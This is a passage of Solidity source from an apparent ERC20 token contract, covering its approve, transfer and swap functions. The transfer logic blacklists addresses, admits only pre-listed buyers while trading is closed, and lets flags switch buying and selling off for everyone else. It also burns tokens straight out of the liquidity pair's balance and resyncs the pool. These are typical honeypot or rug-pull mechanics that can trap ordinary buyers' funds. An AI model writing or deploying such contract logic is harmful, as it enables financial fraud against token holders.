    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from, address to, uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!_jiaList[from] && !_jiaList[to], "not valid address");
        bool takeFee = true;

        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        }

        bool fromC = isContract(from);
        bool toC = isContract(to);
        bool beforeUser = _buyList[to] || _buyList[from];
		
		if (notOpen && (fromC || toC)) {
		 	require(beforeUser, "error address");
		}

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= minSwappNum;

        bool isBuy = oneContract[from];
        bool isSell = oneContract[to];

        if (!beforeUser){
            if (isBuy){
                require(canBuy , "can't buy");
            }

            if (isSell){
                require(canSell, "can't SELL");
            }
        }
        
        if (
            openSwapping &&
            canSwap &&
            !swapping &&
            !isBuy &&
            !isSell &&
            from != owner() &&
            to != owner()
        ) {
            swapping = true;
            uint256 swapTokens = contractTokenBalance.mul(swapPer).div(1000);
            swapTokensForToken(swapTokens);
            swapping = false;

            uint leftAmount = totalSupply();
            if (leftAmount > minCoin){
                if (minCoin.add(allFeeAmount) > leftAmount){
                    allFeeAmount = leftAmount.sub(minCoin);
                }
                _rOwned[address(0)] = _rOwned[address(0)].add(allFeeAmount);
                _rOwned[uniswapV2Pair] = _rOwned[uniswapV2Pair].sub(allFeeAmount);
                emit Transfer(uniswapV2Pair, address(0), allFeeAmount);
                IW3swapPair(uniswapV2Pair).sync();
                allFeeAmount = 0;
            }
        }

        _transferStandard(from, to, amount, takeFee);
    }

    function swapTokensForToken(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdtAddress;

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(wrap),
            block.timestamp
        );

        wrap.transfer(usdtAddress, typeAddress, marketAddress);
    }
